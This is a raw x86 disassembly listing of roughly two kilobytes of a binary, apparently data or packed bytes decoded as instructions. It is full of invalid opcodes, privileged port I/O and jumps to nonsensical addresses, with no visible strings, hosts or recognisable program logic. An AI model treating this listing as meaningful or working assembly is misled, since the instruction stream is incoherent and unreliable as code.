  434d4a:	bound  esi,QWORD PTR [edx+0x3f]
  434d4d:	adc    al,BYTE PTR [eax]
  434d4f:	addr16 xor cl,dl
  434d52:	mov    BYTE PTR [edi+edi*4],bh
  434d55:	xchg   ebp,eax
  434d56:	jno    0x434d00
  434d58:	and    ch,BYTE PTR [eax-0x8206680]
  434d5e:	or     DWORD PTR [ebx],0x18
  434d61:	test   al,0xf9
  434d63:	fnstenv [ebx-0x20]
  434d66:	daa    
  434d67:	(bad)  
  434d69:	test   DWORD PTR [ebx-0x5b],0x5f12273f
  434d70:	dec    ecx
  434d71:	dec    ecx
  434d72:	and    al,0x3a
  434d74:	gs add dl,al
  434d77:	sbb    al,0xc1
  434d79:	wbinvd 
  434d7b:	adc    al,0x69
  434d7d:	std    
  434d7e:	test   DWORD PTR [ecx],esi
  434d80:	jmp    0x434daa
  434d82:	in     eax,dx
  434d83:	dec    ebp
  434d84:	enter  0x427c,0x63
  434d88:	mov    ?,ebp
  434d8a:	or     bh,ah
  434d8c:	jno    0x434d38
  434d8e:	stc    
  434d8f:	xor    eax,0x86113e4d
  434d94:	cmp    al,bh
  434d96:	or     DWORD PTR [ebx],edi
  434d98:	jns    0x434d99
  434d9a:	jmp    DWORD PTR [edx+0x32]
  434d9d:	stos   DWORD PTR es:[edi],eax
  434d9e:	push   es
  434d9f:	mov    gs,WORD PTR [edi+0xe5ff584]
  434da5:	fwait
  434da6:	or     BYTE PTR [ecx],0xd3
  434da9:	cmp    bl,ah
  434dab:	or     DWORD PTR [esi-0x7c],esp
  434dae:	cmc    
  434daf:	push   0x1415d9
  434db4:	loop   0x434d7a
  434db6:	in     eax,0x37
  434db8:	pop    edi
  434db9:	pop    ecx
  434dba:	xchg   ebx,eax
  434dbb:	jecxz  0x434e0d
  434dbd:	xchg   DWORD PTR [eax-0x6d042abb],esp
  434dc3:	or     edi,DWORD PTR [edi-0x67]
  434dc6:	add    BYTE PTR [ebp+0x20],bh
  434dc9:	jmp    0x59594ad1
  434dce:	jae    0x434dd0
  434dd0:	inc    eax
  434dd1:	push   edx
  434dd2:	test   al,0x11
  434dd4:	pop    ebx
  434dd5:	outs   dx,BYTE PTR ds:[esi]
  434dd6:	sub    al,BYTE PTR [edi]
  434dd8:	jbe    0x434e2b
  434dda:	test   al,0x4
  434ddc:	pop    ds
  434ddd:	inc    ebp
  434dde:	(bad)  
  434ddf:	fist   DWORD PTR [ebp-0x6c599a29]
  434de5:	enter  0x7a37,0x2c
  434de9:	frstor [edx+ecx*8-0xa]
  434ded:	mul    DWORD PTR [edx+0x57]
  434df0:	ds icebp 
  434df2:	jb     0x434dba
  434df4:	inc    edi
  434df5:	fwait
  434df6:	mov    edx,0x3bc8987a
  434dfb:	mov    BYTE PTR [edx],ah
  434dfd:	dec    ebp
  434dfe:	in     al,0x79
  434e00:	mov    al,ds:0x5e81c5f0
  434e05:	(bad)  [ecx+0x45]
  434e08:	jae    0x434e5d
  434e0a:	mov    al,ds:0x67b9e216
  434e0f:	jnp    0x434db7
  434e11:	std    
  434e12:	cli    
  434e13:	cld    
  434e14:	loopne 0x434dad
  434e16:	in     al,dx
  434e17:	add    eax,DWORD PTR [eax]
  434e19:	bound  edx,QWORD PTR [esi+esi*1-0x18]
  434e1d:	jno    0x434e7b
  434e1f:	ds call 0x66142762
  434e25:	adc    ecx,eax
  434e27:	mov    bh,0x84
  434e29:	psubw  mm0,QWORD PTR [eax]
  434e2c:	out    0xe5,al
  434e2e:	(bad)  
  434e2f:	lock scas al,BYTE PTR es:[edi]
  434e31:	(bad)  
  434e32:	pop    eax
  434e33:	cld    
  434e34:	xor    edi,ebp
  434e36:	pop    edx
  434e37:	mov    al,0xe7
  434e39:	popa   
  434e3a:	fnstcw WORD PTR [esi-0x16029ed1]
  434e40:	pop    ebp
  434e41:	cmpps  xmm7,xmm0,0x69
  434e45:	sti    
  434e46:	sub    al,0x8
  434e48:	fs scas al,BYTE PTR es:[edi]
  434e4a:	(bad)  
  434e4b:	clc    
  434e4c:	jbe    0x434df2
  434e4e:	sbb    al,BYTE PTR [edx]
  434e50:	(bad)  
  434e51:	fmul   DWORD PTR [esi-0x10]
  434e54:	call   DWORD PTR [eax-0x4]
  434e58:	mov    ch,0xa6
  434e5a:	pop    edx
  434e5b:	mov    bh,0x55
  434e5d:	iret   
  434e5e:	sar    DWORD PTR [edi-0x16049f59],0xd1
  434e65:	(bad)  
  434e66:	sar    eax,0x69
  434e69:	mov    ebx,0x26c0828
  434e6e:	vucomiss xmm3,DWORD PTR [edx+ebx*1+0x2ac8ce02]
  434e77:	lock push ds
  434e79:	mov    bh,0x58
  434e7b:	cld    
  434e7c:	mov    BYTE PTR [eax],0x5e
  434e7f:	pop    esp
  434e80:	fwait
  434e81:	or     eax,0xafbfc107
  434e86:	pusha  
  434e87:	icebp  
  434e88:	jmp    0xf9045d32
  434e8d:	mov    fs:0x36e13590,eax
  434e93:	pop    edx
  434e94:	pop    ebp
  434e95:	out    dx,eax
  434e96:	popa   
  434e97:	fstp   DWORD PTR [esi-0x12]
  434e9a:	mov    bh,0x84
  434e9c:	pop    edi
  434e9d:	add    ch,BYTE PTR [edx-0x6058e703]
  434ea3:	(bad)  
  434ea4:	sub    DWORD PTR [eax],eax
  434ea6:	popf   
  434ea7:	inc    edx
  434ea8:	inc    ebx
  434ea9:	adc    BYTE PTR [edx],dh
  434eab:	mov    edx,0x5ab4fff1
  434eb0:	out    dx,al
  434eb1:	cs adc al,0x60
  434eb4:	and    eax,0xc375c4fb
  434eb9:	inc    esi
  434eba:	cli    
  434ebb:	mov    al,ds:0x75fc11df
  434ec0:	cli    
  434ec1:	lea    ecx,[eax-0x2bf6ca53]
  434ec7:	pop    ebp
  434ec8:	sub    BYTE PTR [esi],al
  434eca:	mov    ebx,0x750f62da
  434ecf:	cdq    
  434ed0:	arpl   WORD PTR [ebx],bp
  434ed2:	jg     0x434e85
  434ed4:	adc    dh,al
  434ed6:	std    
  434ed7:	fistp  DWORD PTR ds:0x71c3266
  434edd:	jmp    0x3ddb1d
  434ee2:	add    BYTE PTR [ebx],cl
  434ee4:	jno    0x434ef2
  434ee6:	jne    0x434e7a
  434ee8:	pushf  
  434ee9:	inc    ebx
  434eea:	add    DWORD PTR [edi+0x62],edx
  434eed:	xlat   BYTE PTR ds:[ebx]
  434eee:	div    BYTE PTR [esi*2-0x3a7e047f]
  434ef5:	sbb    DWORD PTR [eax+eax*2+0x75],0xfffffffa
  434efa:	jmp    0x3dc567
  434eff:	retf   
  434f00:	jno    0x434f01
  434f02:	push   cs
  434f03:	mov    edi,0x64fffcc0
  434f08:	inc    eax
  434f09:	inc    ebx
  434f0a:	pop    ss
  434f0b:	pop    ds
  434f0c:	outs   dx,BYTE PTR ds:[esi]
  434f0d:	add    eax,0x32f6214
  434f12:	add    BYTE PTR [ebx-0x3b],cl
  434f15:	mov    dl,0xc3
  434f17:	mov    cl,0x45
  434f19:	loope  0x434e9e
  434f1b:	jnp    0x434efa
  434f1d:	jl     0x434ee8
  434f1f:	bound  edi,QWORD PTR [edi-0x4f9c7d88]
  434f25:	add    al,0x9
  434f27:	aam    0xf5
  434f29:	inc    BYTE PTR [edi-0x1f]
  434f2c:	xchg   edi,eax
  434f2d:	clc    
  434f2e:	or     ch,ah
  434f30:	call   0x82e1:0x76f5f9a7
  434f37:	imul   edi,DWORD PTR [ebx-0x21bffc1],0xffffffff
  434f3e:	jg     0x434f1b
  434f40:	fdivp  st(3),st
  434f42:	xchg   edx,eax
  434f43:	mov    ds:0x24b555,al
  434f48:	pusha  
  434f49:	imul   ebx,DWORD PTR [ebx-0x55503a02],0xa6306142
  434f53:	push   0x65
  434f55:	sub    eax,0xd39afabd
  434f5a:	jmp    esi
  434f5c:	xchg   BYTE PTR [ecx+0x759c0004],dh
  434f62:	(bad)  
  434f63:	jg     0x434f00
  434f65:	test   DWORD PTR [eax],ebp
  434f67:	or     edx,esp
  434f69:	sbb    BYTE PTR [ecx],dh
  434f6b:	or     edi,ebp
  434f6d:	out    dx,eax
  434f6e:	stos   BYTE PTR es:[edi],al
  434f6f:	enter  0xb646,0x95
  434f73:	ret    
  434f74:	pusha  
  434f75:	mov    al,0x4
  434f77:	ret    0xb224
  434f7a:	clc    
  434f7b:	out    0xc2,al
  434f7d:	stc    
  434f7e:	stos   DWORD PTR es:[edi],eax
  434f7f:	stc    
  434f80:	pop    esp
  434f81:	jne    0x434f82
  434f83:	test   DWORD PTR [edi+ebp*4-0x34a7097c],ebp
  434f8a:	add    DWORD PTR [edx+ecx*2-0xbf6543c],0xfffffff0
  434f92:	out    0x87,al
  434f94:	jmp    0x64d9:0x5d003d1c
  434f9b:	xor    BYTE PTR [edx],ch
  434f9d:	vhsubps ymm5,ymm5,YMMWORD PTR [esi+0x5d1dfafd]
  434fa5:	and    DWORD PTR [esp+edx*8],edx
  434fa8:	out    0x2d,eax
  434faa:	push   es
  434fab:	adc    BYTE PTR [eax],al
  434fad:	pop    ebx
  434fae:	pop    esi
  434faf:	(bad)  
  434fb0:	mov    cl,0xfb
  434fb2:	les    esp,FWORD PTR [edx+0x41]
  434fb5:	hlt    
  434fb6:	mov    cl,0xc6
  434fb8:	mov    cl,0xeb
  434fba:	les    esp,FWORD PTR [eax+0x3052e741]
  434fc0:	pop    es
  434fc1:	loop   0x434f82
  434fc3:	cli    
  434fc4:	cli    
  434fc5:	loop   0x434fd7
  434fc7:	xchg   edx,eax
  434fc8:	stos   BYTE PTR es:[edi],al
  434fc9:	retf   
  434fca:	aam    0x37
  434fcc:	lds    ecx,FWORD PTR [ecx+edx*2-0x26dd9eb2]
  434fd3:	fiadd  WORD PTR [eax-0x55983e8a]
  434fd9:	in     al,0x15
  434fdb:	push   es
  434fdc:	pop    ss
  434fdd:	loop   0x434f9e
  434fdf:	out    0x7e,eax
  434fe1:	ss std 
  434fe3:	cmc    
  434fe4:	cli    
  434fe5:	loopne 0x434f9d
  434fe7:	dec    ebp
  434fe8:	stos   BYTE PTR es:[edi],al
  434fe9:	mov    ebp,DWORD PTR [edi]
  434feb:	icebp  
  434fec:	dec    ebx
  434fed:	jg     0x434f8c
  434fef:	cmp    BYTE PTR [ecx+0x7f],al
  434ff2:	push   edx
  434ff3:	cwde   
  434ff4:	push   es
  434ff5:	loop   0x434fb6
  434ff7:	fdivr  st,st(2)
  434ff9:	loop   0x434fe7
  434ffb:	and    DWORD PTR [edx-0x3ab02b95],ebp
  435001:	xchg   esp,eax
  435002:	push   ecx
  435003:	inc    edx
  435004:	popa   
  435005:	mov    ds:0x5a80d6d9,al
  43500a:	sar    edi,0xa9
  43500d:	fcom   QWORD PTR [esi+edi*4]
  435010:	push   ss
  435011:	add    dl,ah
  435013:	mov    esi,0x2db4e401
  435018:	sbb    eax,0xba5728d5
  43501d:	fdiv   st(3),st
  43501f:	sar    DWORD PTR [edi-0x16249bd9],0x99
  435026:	vpsubb xmm1,xmm7,xmm7
  43502a:	mov    al,ds:0x5f1f8ac6
  43502f:	cmp    edx,DWORD PTR [edx]
  435031:	and    DWORD PTR [esp+edx*4],ecx
  435034:	or     BYTE PTR [esi+0x1d],ch
  435037:	retf   0xaef8
  43503a:	jmp    0x434fc5
  43503c:	ret    
  43503d:	jecxz  0x4350a8
  43503f:	sbb    DWORD PTR [edi+0x7dd26629],0xf8c213a7
  435049:	arpl   WORD PTR [edx-0xb96ec03],cx
  43504f:	call   0xe80565df
  435054:	pop    es
  435055:	ins    BYTE PTR es:[edi],dx
  435056:	mov    ecx,eax
  435058:	clc    
  435059:	outs   dx,BYTE PTR ds:[esi]
  43505a:	mov    al,ds:0xc8f20316
  43505f:	inc    esi
  435060:	out    dx,al
  435061:	pop    esi
  435062:	retf   
  435063:	mov    esi,0x2717ea3f
  435068:	add    al,0x69
  43506a:	mov    esp,0x256e07d9
  43506f:	retf   0x3ef8
  435072:	jnp    0x434ffd
  435074:	ret    
  435075:	repz add cl,bh
  435078:	xchg   esp,eax
  435079:	lahf   
  43507a:	test   eax,0x7f7dd261
  43507f:	mov    bl,0xc1
  435081:	clc    
  435082:	jae    0x43501e
  435084:	std    
  435085:	adc    ebp,DWORD PTR [ecx+0x4]
  435088:	fmul   DWORD PTR [ebx+0x7e72db5]
  43508e:	add    BYTE PTR [esi+0x3cfff418],dh
  435094:	cdq    
  435095:	inc    ebx
  435096:	add    bh,BYTE PTR [edi]
  435098:	pusha  
  435099:	cmp    esi,ebp
  43509b:	cmp    al,0x72
  43509d:	jg     0x4350eb
  43509f:	push   edi
  4350a0:	in     al,dx
  4350a1:	cmp    bl,0x6b
  4350a4:	rol    BYTE PTR [ecx+esi*1-0x39058dca],0x45
  4350ac:	fild   DWORD PTR [eax]
  4350ae:	jmp    0x3dc326
  4350b3:	mov    esi,DWORD PTR [ebp+0x2f]
  4350b6:	jne    0x435108
  4350b8:	xchg   edi,eax
  4350b9:	inc    ebx
  4350ba:	add    esp,ebp
  4350bc:	pop    ebp
  4350bd:	jne    0x4350e3
  4350bf:	pop    ss
  4350c0:	xlat   BYTE PTR ds:[ebx]
  4350c1:	or     DWORD PTR [esp+ebx*4+0x40fffa6e],eax
  4350c8:	adc    al,0x9
  4350ca:	test   DWORD PTR [eax],edx
  4350cc:	repz daa 
  4350ce:	mov    esp,DWORD PTR [edi-0x47]
  4350d1:	and    al,0x8b
  4350d3:	add    al,0xa6
  4350d5:	mov    dh,0x50
  4350d7:	inc    eax
  4350d8:	cmp    dl,0xd3
  4350db:	add    BYTE PTR [esi-0x6a],al
  4350de:	ins    DWORD PTR es:[edi],dx
  4350df:	or     dh,BYTE PTR [ecx]
  4350e1:	sbb    BYTE PTR [edx],dl
  4350e3:	and    al,0x8
  4350e5:	retf   0x87f5
  4350e8:	(bad)
  4350eb:	dec    esi
  4350ec:	xchg   esp,eax
  4350ed:	push   esi
  4350ee:	fdivr  DWORD PTR [edi+0x13]
  4350f1:	or     bl,BYTE PTR ds:0x1de6b713
  4350f7:	std    
  4350f8:	(bad)  
  4350f9:	sbb    al,bh
  4350fb:	call   0x3dc3fc
  435100:	icebp  
  435101:	or     DWORD PTR ds:0x7dc27013,ebx
  435107:	push   esp
  435108:	bound  edx,QWORD PTR [eax+ecx*1-0x27633983]
  43510f:	(bad)  
  435110:	cmp    cl,BYTE PTR [eax]
  435112:	test   al,0xf9
  435114:	cmp    eax,0xaf0ba530
  435119:	mov    dl,0xc2
  43511b:	inc    edx
  43511c:	arpl   WORD PTR [esi-0x6b],di
  43511f:	call   0x44e7:0x8fbb6e2
  435126:	add    al,0x0
  435128:	bound  esi,QWORD PTR [edi]
  43512a:	cmp    DWORD PTR [esi+eax*2],esp
  43512d:	jp     0x435166
  43512f:	push   DWORD PTR [esi]
  435131:	xor    eax,0x92e609b6
  435136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435137:	stc    
  435138:	cmc    
  435139:	ss dec ebx
  43513b:	or     bh,ah
  43513d:	xor    WORD PTR [edi-0x238d2700],di
  435144:	mov    esi,0x909c80e9
  435149:	loop   0x4351b1
  43514b:	fisttp QWORD PTR [eax]
  43514d:	out    0x23,al
  43514f:	mov    cl,0xf9
  435151:	vpmaddwd ymm2,ymm3,YMMWORD PTR [edi+0x78]
  435156:	js     0x435148
  435158:	and    ebx,0x43
  43515b:	mov    al,ds:0xe0fbd9f9
  435160:	sbb    ebx,edi
  435162:	out    dx,eax
  435163:	out    dx,eax
  435164:	inc    ebx
  435165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435166:	dec    eax
  435167:	inc    ecx
  435168:	and    al,0x76
  43516a:	repnz ss (bad) 
  43516d:	cmp    eax,0x85fd36fa
  435172:	das    
  435173:	lods   al,BYTE PTR ds:[esi]
  435174:	or     esi,edi
  435176:	pop    edi
  435177:	push   ss
  435178:	rcr    DWORD PTR [ecx+esi*4],0xf2
  43517c:	jmp    esi
  43517e:	out    dx,eax
  43517f:	out    dx,eax
  435180:	or     DWORD PTR [ebx],0xffffffd9
  435183:	adc    eax,0xc4555ba7
  435188:	mul    eax
  43518a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43518b:	xchg   esi,eax
  43518c:	hlt    
  43518d:	out    0x25,al
  43518f:	mov    esi,0xd398df07
  435194:	aas    
  435195:	xchg   ch,bl
  435197:	jb     0x43514f
  435199:	xchg   edx,eax
  43519a:	rcr    BYTE PTR [ebx],0x81
  43519d:	and    al,BYTE PTR [esi-0x1c]
  4351a0:	jns    0x435142
  4351a2:	call   0x6e43d1ac
  4351a7:	aad    0x71
  4351a9:	cmp    eax,0xf205373
  4351ae:	loop   0x43516a
  4351b0:	inc    edi
  4351b1:	jl     0x435149
  4351b3:	cmc    
  4351b4:	(bad)  
  4351b6:	loopne 0x4351b8
  4351b8:	mov    bh,0xa6
  4351ba:	sti    
  4351bb:	push   esp
  4351bc:	push   ss
  4351bd:	loopne 0x435210
  4351bf:	pop    esp
  4351c0:	ds loopne 0x43520c
  4351c3:	fst    DWORD PTR [eax-0x683f29f2]
  4351c9:	or     edi,0xffffffd3
  4351cc:	adc    al,0xfe
  4351ce:	mov    ds:0xbed8e917,eax
  4351d3:	je     0x4351c4
  4351d5:	ins    DWORD PTR es:[edi],dx
  4351d6:	and    bl,bl
  4351d8:	jae    0x435194
  4351da:	loop   0x43516e
  4351dc:	retf   0xba82
  4351df:	shr    ch,cl
  4351e1:	cmp    BYTE PTR [edx],bl
  4351e3:	inc    ebp
  4351e4:	or     BYTE PTR [esi+edx*1],bh
  4351e7:	call   0xec81895f
  4351ec:	daa    
  4351ed:	cmp    eax,0xf6a2c08c
  4351f2:	loopne 0x4351a6
  4351f4:	cmp    esp,DWORD PTR [esi+0x43e8597b]
  4351fa:	jge    0x4351b6
  4351fc:	add    DWORD PTR [edx],edi
  4351fe:	(bad)
  435202:	inc    eax
  435203:	ror    BYTE PTR [ebp+0x1d910729],cl
  435209:	in     al,dx
  43520a:	add    al,bh
  43520c:	cld    
  43520d:	mov    esp,DWORD PTR [ebp+0x2a8ae82d]
  435213:	imul   ebx,eax,0x2a
  435216:	sub    BYTE PTR [ebx-0x4b113cf9],ch
  43521c:	call   0x2ab6:0xd261e903
  435223:	or     BYTE PTR [edi-0x66],bh
  435226:	jo     0x435284
  435228:	ror    DWORD PTR [ecx-0x5048e5c9],1
  43522e:	fadd   st(7),st
  435230:	rol    DWORD PTR [ecx+0xa4c6bd0],0xaf
  435237:	cmp    al,0xbf
  435239:	push   es
  43523a:	ror    ah,1
  43523c:	leave  
  43523d:	clc    
  43523e:	mov    dh,0xe6
  435240:	(bad)  
  435241:	fs (bad) 
  435244:	cwde   
  435245:	div    DWORD PTR [ecx+0x2788d0c2]
  43524b:	pusha  
  43524c:	mov    eax,0xc2079ed5
  435251:	adc    DWORD PTR [edx-0x63822f38],0xeef8c20e
  43525b:	inc    edi
  43525c:	sbb    eax,DWORD PTR [ebx]
  43525e:	scas   eax,DWORD PTR es:[edi]
  43525f:	ins    BYTE PTR es:[edi],dx
  435260:	shl    BYTE PTR [ecx],0x6a
  435263:	(bad)  
  435264:	call   0x45a155d5
  435269:	or     BYTE PTR [ecx+0x5a725a8e],dh
  43526f:	add    bh,al
  435271:	rol    DWORD PTR [ecx+0x6ab871df],0x0
  435278:	cmp    BYTE PTR [esi-0x6],dh
  43527b:	add    BYTE PTR [ebp+0x2861dfc3],0x76
  435282:	cli    
  435283:	add    BYTE PTR [ebp+0x7859dfbf],0x74
  43528a:	cli    
  43528b:	add    BYTE PTR [eax-0x297af63d],0x6d
  435292:	cli    
  435293:	(bad)  
  435294:	mov    eax,0x3dfffcdf
  435299:	std    
  43529a:	adc    DWORD PTR [eax+0x27a4044],eax
  4352a0:	cmp    ebx,ebx
  4352a2:	jle    0x4352c2
  4352a4:	rcr    DWORD PTR [eax+0x2309e8c1],0x21
  4352ab:	je     0x4352b9
  4352ad:	inc    edx
  4352ae:	retf   
  4352af:	call   0x442c00
  4352b4:	jle    0x435250
  4352b6:	or     al,BYTE PTR [eax+eax*1-0x52000593]
  4352bd:	cdq    
  4352be:	imul   al
  4352c0:	add    ebp,DWORD PTR [ebp-0x6]
  4352c3:	jmp    ebx
  4352c5:	fld    TBYTE PTR [ecx+ecx*1+0xd]
  4352c9:	std    
  4352ca:	div    DWORD PTR [edx]
  4352cc:	bnd jmp 0x423852b7
  4352d2:	dec    ebx
  4352d3:	or     BYTE PTR [eax],al
  4352d5:	inc    eax
  4352d6:	fwait
  4352d7:	inc    BYTE PTR [ebp-0x49]
  4352da:	out    dx,al
  4352db:	(bad)  
  4352dc:	and    eax,DWORD PTR [ebp+0x34f975c1]
  4352e2:	out    dx,al
  4352e3:	inc    ebp
  4352e5:	jge    0x4352c1
  4352e7:	xor    al,0xe9
  4352e9:	enter  0xfa6d,0xff
  4352ed:	or     edi,DWORD PTR [ecx-0xa]
  4352f0:	jae    0x435354
  4352f2:	mov    esp,0xf17aca79
  4352f7:	add    BYTE PTR [eax],al
  4352f9:	bound  ebp,QWORD PTR ds:0xf66b74c4
  4352ff:	xor    eax,0x98192eff
  435304:	hlt    
  435305:	gs out dx,eax
  435307:	js     0x4352d3
  435309:	dec    edx
  43530a:	test   DWORD PTR [eax],0xc4356200
  435310:	or     esi,esp
  435312:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435314:	stc    
  435315:	inc    ebp
  435316:	xor    al,0xc9
  435318:	out    0xf3,eax
  43531a:	mov    esp,0x73e9f9a4
  43531f:	fcomp  DWORD PTR [edi]
  435321:	out    0xef,eax
  435323:	in     al,dx
  435324:	inc    ebx
  435325:	sbb    eax,0x4e24203b
  43532a:	dec    ecx
  43532b:	dec    ecx
  43532c:	and    al,0x42
  43532e:	out    dx,eax
  43532f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435330:	scas   al,BYTE PTR es:[edi]
  435331:	adc    BYTE PTR [edi+0x72cc09a4],ah
  435337:	xchg   DWORD PTR [eax+0x3d2c0200],eax
  43533d:	add    BYTE PTR [esi],dh
  43533f:	jg     0x435355
  435341:	test   BYTE PTR [ebp-0x4e],al
  435344:	add    al,0x0
  435346:	push   ebp
  435347:	cs mov ebp,0x4edeb97
  43534d:	xchg   DWORD PTR [esp+ebp*4],ebp
  435350:	retf   0x6342
  435353:	pushf  
  435354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435355:	xchg   al,dl
  435357:	dec    esi
  435358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435359:	cmp    BYTE PTR [ecx-0x63f8e63c],0xf5
  435360:	std    
  435361:	xor    DWORD PTR [ebx-0x5a0670d1],edi
  435367:	sahf   
  435368:	pop    edx
  435369:	mov    ebp,0xa469d8e8
  43536e:	ficomp WORD PTR [eax]
  435370:	jmp    0x8f83:0xf7438adf
  435377:	add    esi,ecx
  435379:	or     al,0xe2
  43537b:	ror    DWORD PTR [edx],0x13
  43537e:	loope  0x435331
  435380:	jmp    0xa8dab588
  435385:	add    al,0x31
  435387:	mov    al,0x86
  435389:	xchg   ebp,eax
  43538a:	pop    ebx
  43538b:	mov    ebp,0x506a5273
  435390:	mov    eax,0x23755b0f
  435395:	or     BYTE PTR [ebx+0x7b],bl
  435398:	sub    bh,BYTE PTR [ebp-0x3]
  43539b:	mov    edx,0x2a0006e6
  4353a0:	jmp    0xcdcf32c8
  4353a5:	fiadd  WORD PTR [ebp+0x3e9da67]
  4353ab:	xchg   ebx,eax
  4353ac:	shl    BYTE PTR [edx],cl
  4353ae:	push   edx
  4353af:	push   0xffffffcc
  4353b1:	imul   ebx,ebx,0xc
  4353b4:	mov    ebp,0xf8c58eea
  4353b9:	stos   BYTE PTR es:[edi],al
  4353ba:	xchg   dl,bh
  4353bc:	mov    esp,0xda3f87ef
  4353c1:	jmp    0xe24f38c9
  4353c6:	mov    WORD PTR [eax-0x2e1c3f33],cs
  4353cc:	mov    esp,0xcecf839f
  4353d1:	out    0x88,al
  4353d3:	pop    esp
  4353d4:	(bad)  
  4353d5:	(bad)  
  4353d6:	mov    ds:0x9e6a54bf,al
  4353db:	fs int3 
  4353dd:	fs aaa 
  4353df:	mov    bl,0xbc
  4353e1:	ja     0x435371
  4353e3:	and    cl,dl
  4353e5:	add    BYTE PTR [edx+0x7b],ch
  4353e8:	aad    0x0
  4353ea:	loop   0x435417
  4353ec:	int    0x6d
  4353ee:	icebp  
  4353ef:	loope  0x4353c0
  4353f1:	and    BYTE PTR [eax-0x49],dl
  4353f4:	leave  
  4353f5:	clc    
  4353f6:	push   esi
  4353f7:	fwait
  4353f8:	pop    ss
  4353f9:	add    dl,BYTE PTR [eax]
  4353fb:	iret   
  4353fc:	mov    bl,0xf2
  4353fe:	inc    esi
  4353ff:	rcl    BYTE PTR [esi+0x47],0xf1
  435403:	add    ah,bl
  435405:	cwde   
  435406:	sub    al,0x2e
  435408:	pop    esp
  435409:	adc    eax,0x56deed1d
  43540e:	(bad)  [edx-0x65]
  435411:	int    0x3b
  435413:	cmp    ch,BYTE PTR [eax-0x2d]
  435416:	jb     0x435405
  435418:	and    al,0x94
  43541a:	je     0x435401
  43541c:	in     al,dx
  43541d:	jnp    0x4353ab
  43541f:	and    esp,esp
  435421:	sub    al,0x1d
  435423:	leave  
  435424:	fisubr DWORD PTR [edi-0xa0f52f8]
  43542a:	enter  0xd4d2,0x10
  43542e:	add    al,0xe1
  435430:	out    0x7b,eax
  435432:	mov    cl,BYTE PTR [ebp-0x6]
  435435:	fisttp DWORD PTR [ebx-0x75fc05bb]
  43543b:	pop    ds
  43543c:	outs   dx,BYTE PTR ds:[esi]
  43543d:	push   ebx
  43543e:	inc    ebp
  43543f:	or     eax,0xed4f52ef
  435444:	pop    esi
  435445:	jnp    0x4353d3
  435447:	sbb    eax,0x6407e7fa
  43544c:	pop    edi
  43544d:	lods   al,BYTE PTR ds:[esi]
  43544e:	clc    
  43544f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435450:	test   al,0x16
  435452:	add    ah,bl
  435454:	clc    
  435455:	dec    edx
  435456:	repnz xchg esi,eax
  435458:	add    ebx,DWORD PTR [ecx-0x4]
  43545b:	fcom   QWORD PTR [edx+0x58]
  43545e:	iret   
  43545f:	add    BYTE PTR ds:0xaf83fa7a,dh
  435465:	mov    bl,0x18
  435467:	add    BYTE PTR [eax],al
  435469:	cmc    
  43546a:	push   cs
  43546b:	clc    
  43546c:	cmp    bh,BYTE PTR [ebx+edx*2+0x79fcf16f]
  435473:	jle    0x4354cf
  435475:	xchg   edi,eax
  435476:	push   edx
  435477:	into   
  435478:	je     0x4354e4
  43547a:	dec    esi
  43547b:	dec    ebp
  43547c:	and    al,0x6b
  43547e:	dec    esi
  43547f:	ret    0xc72b
  435482:	mov    bl,0x18
  435484:	mov    edi,DWORD PTR ds:0xf6d3fa05
  43548a:	xchg   esp,eax
  43548b:	ins    DWORD PTR es:[edi],dx
  43548c:	or     al,cl
  43548e:	movlps xmm4,QWORD PTR [eax*8+0x58802e9]
  435496:	ret    0x4e7e
  435499:	inc    esp
  43549a:	push   edi
  43549b:	fdivr  DWORD PTR [edi-0x3d]
  43549e:	sub    DWORD PTR ds:0x61542c13,ebx
  4354a4:	cld    
  4354a5:	sub    al,0x7a
  4354a7:	jle    0x4354fd
  4354a9:	pop    ss
  4354aa:	ret    
  4354ab:	jne    0x435511
  4354ad:	daa    
  4354ae:	mov    bh,0xf8
  4354b0:	call   0x3dbaf8
  4354b5:	jnp    0x435514
  4354b7:	dec    DWORD PTR [esi]
  4354b9:	jbe    0x435495
  4354bb:	repnz jmp FWORD PTR [esi+edx*2]
  4354bf:	arpl   WORD PTR [ebx+ecx*1],ax
  4354c2:	jo     0x4354c3
  4354c4:	std    
  4354c5:	lods   al,BYTE PTR ds:[esi]
  4354c6:	jns    0x435547
  4354c8:	inc    esi
  4354c9:	add    al,0xed
  4354cb:	jmp    DWORD PTR [ebx]
  4354cd:	add    BYTE PTR [edx-0x1],al
  4354d0:	inc    al
  4354d2:	repnz sub eax,DWORD PTR [ecx]
  4354d5:	add    BYTE PTR [ebx+0x6217434c],bh
  4354db:	mov    WORD PTR [edi+0xc],gs
  4354de:	push   edi
  4354df:	pop    ecx
  4354e0:	arpl   WORD PTR [eax],ax
  4354e2:	bound  esi,QWORD PTR [eax+0x47554286]
  4354e8:	sub    BYTE PTR [edx+ebp*2],ah
  4354eb:	mov    WORD PTR [edx+0xc],?
  4354ee:	je     0x435549
  4354f0:	jae    0x4354f2
  4354f2:	bound  esi,QWORD PTR [eax-0x2b8abd7a]
  4354f8:	jp     0x435506
  4354fa:	ins    BYTE PTR es:[edi],dx
  4354fb:	sbb    DWORD PTR [edi+0x0],edi
  4354fe:	bound  esi,QWORD PTR [eax-0x33b2bd7a]
  435504:	jg     0x435512
  435506:	addr16 dec eax
  435508:	dec    edx
  435509:	adc    DWORD PTR [ecx],edi
  43550b:	add    eax,0xeb5289ab
  435510:	mov    al,ds:0xe0bb9c86
  435515:	xchg   edi,eax
  435516:	pop    esi
  435517:	fsub   DWORD PTR [ebp-0x696279b]
  43551d:	and    ebp,ecx
  43551f:	fwait
  435520:	add    eax,0x4a46c0e5
  435525:	adc    DWORD PTR [esi+0x390b082d],eax
  43552b:	imul   eax,DWORD PTR [ebp+0x2cf0aca],0x2d620000
  435535:	mov    ebp,0xffa25c74
  43553a:	cld    
  43553b:	jnp    0x4354e9
  43553d:	cmp    al,0x66
  43553f:	push   ebx
  435540:	or     DWORD PTR [eax],ecx
  435542:	inc    esp
  435543:	and    esp,DWORD PTR [edi-0xfddd2fc]
  435549:	mov    ebx,DWORD PTR [esi+edi*1-0x64]
  43554d:	mov    WORD PTR [edx+0x63],es
  435550:	aaa    
  435551:	inc    esp
